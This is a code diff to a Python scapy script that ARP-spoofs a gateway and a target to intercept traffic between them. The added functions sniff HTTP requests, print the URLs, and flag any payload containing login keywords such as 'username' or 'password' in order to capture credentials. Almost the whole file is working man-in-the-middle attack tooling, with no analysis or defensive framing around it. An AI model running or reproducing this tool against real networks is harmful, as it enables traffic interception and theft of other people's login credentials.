@@ -1,6 +1,7 @@
 import scapy.all as scapy
 import time
 import argparse
+from scapy.layers import http
 
 def get_args():
     parser = argparse.ArgumentParser()
@@ -26,13 +27,36 @@ def get_mac(ip):
 def spoof(targetIp, spoofIp):
 	packet = scapy.ARP(op= 2, pdst=targetIp, hwdst=get_mac(targetIp), psrc = spoofIp)
 	scapy.send(packet,verbose = False)
-	print(packet.summary())
+	#print(packet.summary())
 	
 def restore(source_ip, destination_ip):
     source_mac = get_mac(source_ip)
     destination_mac = get_mac(destination_ip)
     restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
     scapy.send(restore_packet, count =1, verbose = False)
+    
+def sniffer (interface):
+	scapy.sniff(iface=interface, store=False,prn=sniffed_packet)
+
+def sniffed_packet(packet):
+	if packet.haslayer(http.HTTPRequest):
+		url = get_url(packet)
+		print("HTTP Request >> " + str(url))
+		login_data = get_login(packet)
+		print("username->password >>" + str(login_data))	
+		
+def get_login(packet):
+	if packet.haslayer(scapy.Raw):
+		load = str(packet[scapy.Raw].load)
+		keywords = ["email", "username", "user", "login", "pass", "password"]
+		for kw in keywords:
+			if kw in load:
+				return load
+
+def get_url(packet):
+	host = packet[http.HTTPRequest].Host or ""
+	path = packet[http.HTTPRequest].Path or ""
+	return host + path
 
 options = get_args()
 
@@ -59,8 +83,9 @@ try:
 	while sent_packets_count <= 30:
 	    spoof(gateway_ip,target_ip)
 	    spoof(target_ip,gateway_ip)
+	    #sniffer("eth0")
 	    sent_packets_count = sent_packets_count + 2
-	    print("[+] Packets sent: " + str(sent_packets_count))
+	    #print("[+] Packets sent: " + str(sent_packets_count))
 	    time.sleep(2)
 	print("\n[-]  Restoring the ARP Tables..... Be Patient")
 	restore(target_ip, gateway_ip)
